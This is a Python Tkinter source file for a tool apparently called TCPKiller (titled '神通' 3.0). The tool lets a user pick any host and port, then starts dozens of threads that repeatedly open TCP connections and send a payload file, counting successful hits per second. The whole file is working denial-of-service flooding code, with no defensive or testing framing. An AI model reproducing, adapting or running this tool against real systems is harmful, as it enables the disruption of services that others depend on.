#coding=utf-8
import socket
import threading
import time
import sys
from tkinter import *
from tkinter import messagebox

socket.setdefaulttimeout(10.0) #timeout
shouldq=1
xs=7 #x-size
ys=5 #y-size
ver='3.0' #version
inited=False
okt=0
delay=0.25

def k(y,x):
    global shouldq,okt,failt
    sta[y][x]['text']='＝＝'
    try:
        while shouldq==0:
            try:
                s=socket.socket()
                s.connect((host,port))
                s.send(content)
                s.close()
                time.sleep(delay)
            except:
                raise
                if shouldq==1:
                    sta[y][x]['text']='　　'
                    return
                sta[y][x]['text']='！！'
                time.sleep(1)
                sta[y][x]['text']='＝＝'
            else:
                if shouldq==1:
                    sta[y][x]['text']='　　'
                    return
                okt+=1
                if sta[y][x]['text']=='－－':
                    sta[y][x]['text']='＋＋'
                else:
                    sta[y][x]['text']='－－'
        sta[y][x]['text']='　　'
        return
    except:
        return

def st():
    global shouldq
    shouldq=0
    if threading.activeCount()>3:
        messagebox.showwarning('TCPKiller',
                               str(threading.activeCount()-3)+'个线程已在运行')
    for y in range(ys):
        for x in range(xs):
            t=threading.Thread(target=k,args=(y,x))
            t.setDaemon(True)
            t.start()
def kill():
    global shouldq
    shouldq=1

def test():
    try:
        s=socket.socket()
        s.connect((host,port))
        s.send(content)
        d=str(s.recv(512))+'…'
        s.close()
    except (OSError,ConnectionRefusedError,TimeoutError) as e:
        messagebox.showwarning('TCPKiller',str(e)+'\n'+host+':'+str(port))
    except:
        messagebox.showerror('TCPKiller','未知错误')
        raise
    else:
        messagebox.showinfo('TCPKiller','测试成功\n'+host+':'+str(port)+'\n'+d)

def init():
    def helps():
        import webbrowser
        webbrowser.open('https://github.com/xmcp/TCPKiller/blob/master/README.md')

    def initt():
        global inited,host,port,content,xs,ys,delay
        inited=True
        host=hostvar.get()
        port=portvar.get()
        xs=xvar.get()
        ys=yvar.get()
        delay=delayvar.get()
        try:
            f=open('content.txt','br')
            content=f.read()
            f.close()
        except:
            content=''
        setup.destroy()
    
    global hostvar,portvar,setup
    setup=Tk()
    
    hostvar=StringVar() #target-hostname
    portvar=IntVar() #target-port
    portvar.set(80)
    xvar=IntVar()
    xvar.set(7)
    yvar=IntVar()
    yvar.set(5)
    delayvar=DoubleVar()
    delayvar.set(0.25)

    ipselect=Entry(setup,textvariable=hostvar)
    portselect=Entry(setup,textvariable=portvar)
    xselect=Entry(setup,textvariable=xvar)
    yselect=Entry(setup,textvariable=yvar)
    delayselect=Entry(setup,textvariable=delayvar)
    setupdone=Button(setup,text='完成',command=initt)

    setup.title('神通 '+ver)
    setup.resizable(False,False)

    Label(setup).grid(row=0,column=0)
    Label(setup,text='主机').grid(row=1,column=0)
    ipselect.grid(row=1,column=1)
    Label(setup,text='端口').grid(row=1,column=2)
    portselect.grid(row=1,column=3)
    Label(setup,text='线程(X轴)').grid(row=2,column=0)
    xselect.grid(row=2,column=1)
    Label(setup,text='线程(Y轴)').grid(row=2,column=2)
    yselect.grid(row=2,column=3)
    Label(setup,text='延时(s)').grid(row=3,column=0)
    delayselect.grid(row=3,column=1)
    setupdone.grid(row=3,column=2)
    Button(setup,text='我该如何填写?',command=helps).grid(row=3,column=3)
    Label(setup).grid(row=4,column=0)
    mainloop()

def stats(callback):
    cached=0
    tall=1
    try:
        while 1:
            if shouldq==0:
                callback.title('成功%s  速率%s (%s)'%(okt,okt-cached,okt//tall))
            else:
                callback.title('神通 '+ver)
            cached=okt
            tall+=1
            time.sleep(1)
    except:
        return

init()
global tk
tk=Tk()
if not inited:
    tk.destroy()
    sys.exit(-1)

sta=[[0 for col in range(xs)] for row in range(ys)]

for y in range(ys):
    for x in range(xs):
        sta[y][x]=Button(tk,text='　　',relief=SUNKEN)
        sta[y][x].grid(column=x,row=y)

bs=Button(tk,text='开始',command=st)
bs.grid(column=xs+1,row=0)
bk=Button(tk,text='停止',command=kill)
bk.grid(column=xs+1,row=1)
bk=Button(tk,text='测试',command=test)
bk.grid(column=xs+1,row=2)

tk.resizable(False,False)
tk.title('神通 '+ver)
t=threading.Thread(target=stats,args=(tk,))
t.setDaemon(True)
t.start()

mainloop()
kill()
